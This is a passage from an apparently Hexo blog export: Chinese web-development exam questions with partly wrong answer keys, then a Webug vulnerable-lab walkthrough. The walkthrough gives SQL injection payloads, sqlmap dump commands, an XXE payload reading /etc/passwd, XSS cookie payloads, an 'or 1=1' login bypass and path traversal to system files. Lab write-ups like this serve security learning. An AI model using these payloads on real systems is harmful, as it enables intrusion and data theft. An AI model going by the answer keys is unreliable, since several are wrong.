个单位</p><p>D、col-offset-x 块元素向右移动 x 个像素</p><p>24、bootstrap 组件不包含（ ）</p><p>A、巨幕 B、面板 C、轮播图 D、分页</p><p>25、以下类可以实现斑马线效果的是（ ）</p><p>A、.table B、.table-striped C、.table-hover D、.table-bordered</p><p>26、下拉列表中可以实现分割线的是（ ）</p><p>A、 .dropup B、.divider C、.dropdown D、.disabled</p><p>27、下列警告框代码中显示为红色的是（ ）</p><p>A、</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成功！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>B、</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>信息！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>C、</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-warning<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>警告！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> </code></pre><p>D、</p><pre class=" language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-danger<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>错误！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>28、按钮组大小类不含哪个（ ）</p><p>A、.btn-group-lg B、.btn-group-sm</p><p>C、.btn-group-md D、.btn-group-xs</p><p>29、下面的代码实现的效果是（ ）</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progress<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progress-bar progress-bar-success<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progressbar<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuenow</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemax</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">60%</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>40% 完成<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progress-bar progress-bar-info<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progressbar<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuenow</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemax</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">30%</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>30% 完成（信息）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progress-bar progress-bar-warning<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>progressbar<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuenow</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>60<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">aria-valuemax</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">20%</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>20% 完成（警告）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>A、三条不同长度的进度条</p><p>B、一条进度堆叠在一起的进度条</p><p>C、显示堆叠在一起的三条不同颜色的进度条</p><p>D、显示三条不同长度的 进度条</p><p>30、不是.container 容器的自适应宽度为（ ）</p><p>A、320px B、750px C、970px D、1170px</p><p>二、多选题（每小题 2 分，共 15 小题，共 30 分）</p><p>1、PHP 中只引入一次外部文件的方法是（ ）</p><p>A、require_once(“filename”); B、include_once(“filename”);</p><p>B、require(“filename”); D、include(“filename”);</p><p>2、PHP 中支持的注释符号有哪些（ BC ）</p><p>A、# B、// C、/ / D、&lt;– –&gt;</p><p>3、PHP 类说法正确的有（ ）</p><p>A、PHP 是单亲继承，子类不允许有多个父类</p><p>B、PHP 接口中的函数不能有函数体，子类可以拥有多个接口。</p><p>C、子类不会调用父类的构造函数</p><p>D、抽象类中的抽象函数在其子类中定义</p><p>4、PHP 中用于检索表单信息的变量是（ ）</p><p>A、$_GET B、$_POST C、$_DELETE D、$_UPDATE</p><p>5、以下可以删除数组元素的函数是（ ）</p><p>A、array_push（） B、array_pop() C、array_shift() D、array_unshift()</p><p>6、PHP 中解决 Ajax 跨域问题的方法有（ ）</p><p>A、使用 jsonp 返回数据</p><p>B、设置返回头</p><p>C、使用代理</p><p>D、没有合适的方法</p><p>7、MySQL 与 PHP 连接时必须声明的信息是（ ）</p><p>A、MySQL 服务器地址</p><p>B、数据库服务器用户名</p><p>C、数据库服务器密码</p><p>D、数据表名</p><p>8、以下查询语句正确的有（ ）</p><p>A、select * from tableA where name=’张三’;</p><p>B、select * from tableA where name=’张 %’ &amp;&amp; age&gt;20;</p><p>C、select * from tableA desc;</p><p>D、select * from tableA group by age;</p><p>9、MySQL 中的删除操作有（ ）</p><p>A、clear table tablename; B、drop table table_name;</p><p>C、drop database db_name ; D、delete from tablename;</p><p>10、Bootstrap 栅格系统关于屏幕大小的类前缀有 ( )</p><p>A、.col-xs B、.col-xl C、.col-lg D、.col-mdo</p><p>11、以下哪些文件 Bootstrap 字体图标文件（ ）</p><p>A、glyphicons-halflings-regular.eot</p><p>B、glyphicons-halflings-regular.svg</p><p>C、glyphicons-halflings-regular.txt</p><p>D、glyphicons-halflings-regular.ttf</p><p>12、Bootstrap 表格中可以表示不同操作的类是（ ）</p><p>A、.error B、.success C、.danger D、.active</p><p>13、Bootstrap 中 Button 的样式有哪些（ ）</p><p>A、btn-clicked B、btn-active C、btn-link D、btn-warning</p><p>14、Bootstrap 轮播插件是常用的插件，有哪些常用的方法（ ）</p><p>A、.carousel(‘stop’) B、.carousel(‘pause’)</p><p>C、.carousel(‘prev’) D、.carousel(‘next’)</p><p>15、在页面中使用 Bootstrap 必须引入的文件是（ ）</p><p>A、boostrap.min.js B、bootstrap.min.css</p><p>C、bootstrap-theme.css D、glyphicons-halflings-regular.svg</p><p>三、判断题（每小题 2 分，共 5 小题，共 10 分。在每小题后对应括号内填入判断结果，正确的选项填写 “√”，错误的选项填写 “×”）</p><p>1、PHP 中变量名不区分大小写（x ）</p><p>2、PHP 中数组类型有关联数组、数值型数组和多维数组（ v ）</p><p>3、PHP 的子类可以访问父类中的私有变量和函数（ x ）</p><p>4、MySQL 只能用于小型项目的数据管理（ v ）</p><p>5、bootstrap 是渐进增强技术实现响应式布局设计（ v ）</p><h1 id="试题四"><a href="#试题四" class="headerlink" title="试题四"></a>试题四</h1><p>一、单选题<br>1、下列 HTML 标记中，属于非成对标记的是（A）。</p><pre class=" language-html"><code class="language-html">A. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>            B. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            C. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>            D. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span><span class="token punctuation">></span></span></code></pre><p>2、CSS3 样式，border-radius 属性作用是什么（A）。<br>A. 创建圆形边角 B. 创建方形边角 C. 控制表的间距 D. 创建彩色边角</p><p>3、在表单标记中，用（A）属性来提交填写的信息、调用表单处理程序。<br>A. method B. name C. style D. action</p><p>4、当 <code>&lt;input&gt;</code> 标签的 type 属性值为（C）时，代表一个可选多项的复选框。<br>A. text B. password C. radio D. checkbox</p><p>5、下列哪项可以设置文本在水平方向上居中（B）。</p><pre class=" language-html"><code class="language-html">A. #mid{text-align:center}B. #mid{text-decoration:center}C. #mid{float:left}D. #mid{text-align:middle}</code></pre><p>6、下列哪种选择器不是 css3 新增的（B）。<br>A. :enabled<br>B. :checked<br>C. :before<br>D. :only-child</p><p>7、查看如下代码：</p><pre class=" language-html"><code class="language-html">function test(a){a=a+10;}var a=10;test(a);console.log(a);</code></pre><p>上述代码执行后，输出变量 a 的值为？（A）<br>A. 10 B. 20 C. 错误 D. undefined</p><p>8、下列关于 HTML 的说法正确的是（C）。<br>A. HTML 是网页的核心，是一种超文本标记的程序设计语言<br>B. 通过网页浏览器阅读 HTML 文件时，web 服务器负责解释插入到 HTML 文本中的各种标记<br>C. HTML 是网页的核心，是一种超文本标记的语言，它是页面描述语言<br>D. 编制 HTML 文件时不需要加入任何标记</p><p>9、用于加亮文本的标签是（B）。</p><pre class=" language-html"><code class="language-html">A. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span><span class="token punctuation">></span></span>            B. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>            C. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mark</span><span class="token punctuation">></span></span>    D. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span></code></pre><p>10、要让一个元素不可见且在文档流中不占位，应该使用下面哪个 CSS 规则（A）。</p><pre class=" language-html"><code class="language-html">A. display: noneB. visibility: hiddenC. overflow: hiddenD. opacity: 0</code></pre><p>11、要去掉文本超链接的下划线，下列正确的是（B）</p><pre class=" language-html"><code class="language-html">A. a{underline:none}B. a{ text-decoration:none}C. a{ text-decoration:underline}D. a{ decoration:no underline}</code></pre><p>12、CSS 如何改变某个元素的文本颜色（A）。</p><pre class=" language-html"><code class="language-html">A. text-color:B. color:C. fgcolor:D. text-color=</code></pre><p>13、MySQL 数据库创建表时，不允许为空可以使用（A）。</p><pre class=" language-html"><code class="language-html">A.NOT NULLB.NO NULLC.NOT BLANKD.NO BLANK</code></pre><p>14、下列数据类型中不属于 MySQL 常用数据的是（B）。</p><pre class=" language-html"><code class="language-html">A.INTB.BARC.TIMED.CHAP</code></pre><p>15、在 MYSQL 中一建立了 “学生” 表，表中有 “学号”、“姓名”“性别” 和 “入学成绩等字段，执行如下 SQL 命令: Select 性别，avg (入学成绩) From 学生 Group by 性别；<br>其结果是（A）。<br>A. 计算并显示所有学生的性别和入学成绩的平均值<br>B. 按性别分组计算并显示性别和入学成绩的平均值<br>C. 计算并显示所有学生的入学成绩<br>D. 按性别分组计算并显示所有学生的入学成绩的平均值</p><p>一、多选题<br>1、使用 jQuery 发送 AJAX 请求，关于请求的类型说法正确的是 （ABC）。<br>A、只能发送 GET 类型请求<br>B、只能发送 POST 类型请求<br>C、可以发送 PUT 类型请求<br>D、可以发送 GET 或者 POST 类型请求</p><p>2、浏览器客户端向服务器发送 AJAX 请求，服务器接收请求，处理完毕后，返回数据为 “处理成功”，AJAX 获取到服务器返回的数据时，以下关于 AJAX 响应属性正确的是（ACD）。</p><pre class=" language-html"><code class="language-html">A、status = 403        B、readyState = 4    C、status = 404        D、readyState = 3</code></pre><p>3、在 Bootstrap 栅格系统中，适应移动端超小设备 (&lt;576px) 和移动端平板设备 (&lt;768px)，使用的类前缀是（ABC）。</p><pre class=" language-html"><code class="language-html">A、.col-md-            B、.col-lg-            C、.col-        D、.col-sm-</code></pre><p>4、XAMPP 套件中包括哪些内容（ABC）。<br>A、PHP B、Apache C、MySQL D、Chrome</p><p>5、PHP 支持的复合数据类型是（BD）。<br>A、Boolean 布尔类型 B、Array 数组<br>C、Resource 资源类型 D、Object 对象</p><p>6、PHP 中可以实现循环的是（ABC）。</p><pre class=" language-html"><code class="language-html">A、for                B、foreach        C、while        D、waiting</code></pre><p>7、在 PHP 类定义中，对属性或方法的访问控制，是通过在前面添加关键字来实现的，以下属于访问控制关键字的选项是（）ABC。</p><pre class=" language-html"><code class="language-html">A、public            B、private            C、protected        D、default</code></pre><p>8、以下哪个方法是预编译中用来绑定参数的（BD）</p><pre class=" language-html"><code class="language-html">A、param()          B、bind_param()        C、bind_result()        D、bind_parem()</code></pre><p>9、PHP 类中成员有哪几种？（ABD）<br>A、成员变量 B、成员常量 C、成员对象 D、成员方法</p><p>10、在移动端使用 Bootstrap 时，导航条在屏幕显示时会被折叠，实现显示和折叠功能的按钮需要如何处理（BCD）。<br>A、折叠按钮设置 data-toggle=’collapsed’，折叠容器需要添加 collapsed 类<br>B、折叠按钮设置 data-toggle=’collapse’，折叠容器需要添加 collapse 类<br>C、折叠按钮设置 data-toggle=’scroll’，折叠容器需要添加 collapse 类<br>D、折叠按钮设置 data-spy=’scroll’，折叠容器需要添加 collapse 类</p><p>二、判断题<br>1、MySQL 中设置语句结束的命令是 delimiter。（X）<br>2、所有的 HTML 标记符都包括开始标记符合结束标记符。（x）<br>3、HTML 语言中，表格有多少对 <tr> 标签就表示有多少列。（X）<br>4、CSS 中的 color 属性用于设置 HTML 元素的背景颜色。（x）<br>5、在不改变元素的显示属性的情况下，元素都是可以设置宽度的，并且能够设置成功。（x）</p><h1 id="专项训练"><a href="#专项训练" class="headerlink" title="专项训练"></a>专项训练</h1><p>1 . HTML5 之前的 HTML 版本是？</p><pre class=" language-html"><code class="language-html">A.HTML 4.01B.HTML 4C.HTML 4.1D.HTML 4.9</code></pre><p>2 . HTML5 的正确 doctype 是？</p><pre class=" language-html"><code class="language-html">A.<span class="token doctype">&lt;!DOCTYPE html></span>B.<span class="token doctype">&lt;!DOCTYPE HTML5></span>C.<span class="token doctype">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 5.0//EN" "http://www.w3.org/TR/html5/strict.dtd"></span></code></pre><p>3 . 在 HTML5 中，哪个元素用于组合标题元素？</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>headings</span><span class="token punctuation">></span></span>D.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hgroup</span><span class="token punctuation">></span></span></code></pre><p>4 . HTML5 中不再支持下面哪个元素？</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>menu</span><span class="token punctuation">></span></span>D.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span><span class="token punctuation">></span></span></code></pre><p>5 . HTML5 中不再支持下面哪个元素？</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cite</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>acronym</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span><span class="token punctuation">></span></span>D.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span><span class="token punctuation">></span></span></code></pre><p>6 . 在 HTML5 中，onblur 和 onfocus 是：<br>A.HTML 元素<br>B. 样式属性<br>C. 事件属性</p><p>7 . 用于播放 HTML5 视频文件的正确 HTML5 元素是：</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>movie</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>media</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">></span></span></code></pre><p>8 . 用于播放 HTML5 音频文件的正确 HTML5 元素是：</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mp3</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sound</span><span class="token punctuation">></span></span></code></pre><p>9 . 在 HTML5 中不再支持 <code>&lt;script&gt;</code> 元素的哪个属性？<br>A.rel<br>B.href<br>C.type<br>D.src</p><p>10 . 在 HTML5 中，哪个方法用于获得用户的当前位置？</p><pre class=" language-html"><code class="language-html">A.getPosition()B.getCurrentPosition()C.getUserPosition()</code></pre><p>11 . 新的 HTML5 全局属性，”contenteditable” 用于：<br>A. 规定元素的上下文菜单。该菜单会在用户点击右键点击元素时出现。<br>B. 规定元素内容是否是可编辑的。<br>C. 从服务器升级内容。<br>D. 返回内容在字符串中首次出现的位置。</p><p>12 . 在 HTML5 中，contextmenu 和 spellcheck 是：<br>A.HTML 属性<br>B.HTML 元素<br>C. 事件属性<br>D. 样式属性</p><p>13 . 在 HTML5 中，您能够直接将 SVG 元素嵌入 HTML 页面中。<br>A. 错误<br>B. 正确<br>14 . 由 SVG 定义的图形是什么格式的？<br>A.CSS<br>B.HTML<br>C.XML<br>15 . HTML5 中的 <code>&lt;canvas&gt;</code> 元素用于：<br>A. 显示数据库记录<br>B. 操作 MySQL 中的数据<br>C. 绘制图形<br>D. 创建可拖动的元素<br>16 . 哪个 HTML5 内建对象用于在画布上绘制？<br>A.getContent<br>B.getContext<br>C.getGraphics<br>D.getCanvas<br>17 . 在 HTML5 中，哪个属性用于规定输入字段是必填的？<br>A.required<br>B.formvalidate<br>C.validate<br>D.placeholder<br>18 . 哪种输入类型定义滑块控件？<br>A.search<br>B.controls<br>C.slider<br>D.range<br>19 . 哪种输入类型用于定义周和年控件（无时区）？<br>A.date<br>B.week<br>C.year<br>20 . 哪个 HTML5 元素用于显示已知范围内的标量测量？</p><pre class=" language-html"><code class="language-html">A.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>gauge</span><span class="token punctuation">></span></span>B.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>range</span><span class="token punctuation">></span></span>C.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>measure</span><span class="token punctuation">></span></span>D.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meter</span><span class="token punctuation">></span></span> </code></pre><p>1.HTML5 之前的 HTML 版本是？<br>正确答案：HTML 4.01</p><p>2.HTML5 的正确 doctype 是？<br>正确答案：<code>&lt;!DOCTYPE html&gt;</code></p><ol start="3"><li>在 HTML5 中，哪个元素用于组合标题元素？<br>正确答案：<code>&lt;hgroup&gt;</code></li></ol><p>4.HTML5 中不再支持下面哪个元素？<br>正确答案：<code>&lt;font&gt;</code></p><p>5.HTML5 中不再支持下面哪个元素？<br>正确答案：<code>&lt;acronym&gt;</code></p><ol start="6"><li><p>在 HTML5 中，onblur 和 onfocus 是：<br>正确答案：事件属性</p></li><li><p>用于播放 HTML5 视频文件的正确 HTML5 元素是：<br>正确答案：<code>&lt;video&gt;</code></p></li><li><p>用于播放 HTML5 音频文件的正确 HTML5 元素是：<br>您的回答：<code>&lt;audio&gt;</code></p></li><li><p>在 HTML5 中不再支持 <code>&lt;script&gt;</code> 元素的哪个属性？<br>正确答案：type</p></li><li><p>在 HTML5 中，哪个方法用于获得用户的当前位置？<br>正确答案：getCurrentPosition ()</p></li><li><p>新的 HTML5 全局属性，”contenteditable” 用于：<br>正确答案：规定元素内容是否是可编辑的。</p></li><li><p>在 HTML5 中，contextmenu 和 spellcheck 是：<br>正确答案：HTML 属性</p></li><li><p>在 HTML5 中，您能够直接将 SVG 元素嵌入 HTML 页面中。<br>正确答案：正确</p></li><li><p>由 SVG 定义的图形是什么格式的？<br>正确答案：<code>XML</code></p></li></ol><p>15.HTML5 中的 <code>&lt;canvas&gt;</code> 元素用于：<br>正确答案：绘制图形</p><ol start="16"><li><p>哪个 HTML5 内建对象用于在画布上绘制？<br>正确答案：getContext</p></li><li><p>在 HTML5 中，哪个属性用于规定输入字段是必填的？<br>正确答案：required</p></li><li><p>哪种输入类型定义滑块控件？<br>正确答案：range</p></li><li><p>哪种输入类型用于定义周和年控件（无时区）？<br>正确答案：week</p></li><li><p>哪个 HTML5 元素用于显示已知范围内的标量测量？<br>正确答案：<meter></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jquery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>菜鸡的Webug之路</title>
      <link href="/posts/2ed8.html"/>
      <url>/posts/2ed8.html</url>
      
        <content type="html"><![CDATA[<h1 id="webug"><a href="#webug" class="headerlink" title="webug"></a>webug</h1><h2 id="1-显错注入"><a href="#1-显错注入" class="headerlink" title="1.显错注入"></a>1.显错注入</h2><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717054467.png" alt="sqlmap跑 "></p><h3 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h3><p><strong>注入的一般流程为：输入点–&gt;数据库–&gt;数据表–&gt;数据列–&gt;数据项</strong> </p><p>加点爆错</p><p>利用order by判断字段个数 </p><p>注释掉后面内容时可用 –+ 或者 # 后者在浏览器中会进行url编码为%23</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717093586.png" alt="手工"></p><p>正常 </p><p>推断字段个数是2个</p><p>使用union 联合查询</p><pre><code>union select 1,group_concat(schema_name) from information_schema.schemata %23   填写字段</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717107744.png" alt="联合"></p><p>union 联合查询数据库</p><pre><code>union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;webug&#39; %23 </code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717125607.png" alt="手工"></p><p>union 联合查询数据表</p><pre><code>union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; %23</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717174779.png" alt="联合 "></p><p>union 联合查询数据内容</p><pre><code>union select 1,flag from webug.flag %23</code></pre><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717150660.png" alt="联合"></p><p>union 联合查询操作系统名</p><p> union select 1,@@version_compile_os %23</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717200081.png" alt="内置函数"></p><p>union 联合查询数据库版本</p><p>union select 1,version() %23</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717218232.png" alt="内置函数"></p><p>union 查询当前使用的数据库</p><p>union select 1,DATABASE() %23</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717345661.png" alt="联合"></p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap -u “网址”      查网站的数据库、操作系统、服务器等版本信息。</p><p>sqlmap -u  “网址 ”  –dbs    所有的数据库</p><p>sqlmap -u  “ 网址 ”  -D 数据库名 –tables    </p><p>sqlmap -u  “ 网址 ”  -D 数据库名 -T 表名 –columns    </p><p>sqlmap -u  “ 网址 ”  -D 数据库名 -T 表名 -C 列名 –dump</p><h2 id="2-布尔注入"><a href="#2-布尔注入" class="headerlink" title="2.布尔注入"></a>2.布尔注入</h2><h3 id="手工-1"><a href="#手工-1" class="headerlink" title="手工"></a>手工</h3><p>加单引，order by猜字段数</p><p>order by 3 爆错   字段为2</p><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717358459.png" alt="布尔"></p><pre><code>and length(database())&gt;4%23   查询数据库名的长度 </code></pre><pre><code>and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;webug&#39; limit 0,1),1,1))&gt;98%23  当前库表</code></pre><h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717362093.png" alt="sqlmap"></p><h2 id="7-xee"><a href="#7-xee" class="headerlink" title="7 xee"></a>7 xee</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;    &lt;!DOCTYPE test [    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;    &lt;test&gt;    &lt;wsw&gt;&amp;xxe;&lt;/wsw&gt;    &lt;/test&gt;    &lt;/!doctype&gt;</code></pre><h2 id="9反射xss"><a href="#9反射xss" class="headerlink" title="9反射xss"></a>9反射xss</h2><p>xxxx/control/xss/xss_1.php?id=<script>alert(document.cookie);</script></p><h2 id="10存储xss"><a href="#10存储xss" class="headerlink" title="10存储xss"></a>10存储xss</h2><p>找到留言板直接</p><p><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p><h2 id="11万能密码绕过"><a href="#11万能密码绕过" class="headerlink" title="11万能密码绕过"></a>11万能密码绕过</h2><p>账号：’or 1=1 or’</p><p>密码随便</p><h2 id="12-domxss"><a href="#12-domxss" class="headerlink" title="12 domxss"></a>12 domxss</h2><p><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/1584717367475.png" alt="没有清空value"></p><p><code>&quot; &gt; &lt;script&gt;alert(documen.cookie)&lt;/script&gt;#</code></p><h2 id="13过滤xss"><a href="#13过滤xss" class="headerlink" title="13过滤xss"></a>13过滤xss</h2><p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p><h2 id="15任意文件下载"><a href="#15任意文件下载" class="headerlink" title="15任意文件下载"></a>15任意文件下载</h2><p>/control/filedownload/file_download.php?file=template/../../../../etc/passwd</p><pre><code>Windows：C:\boot.ini //查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini 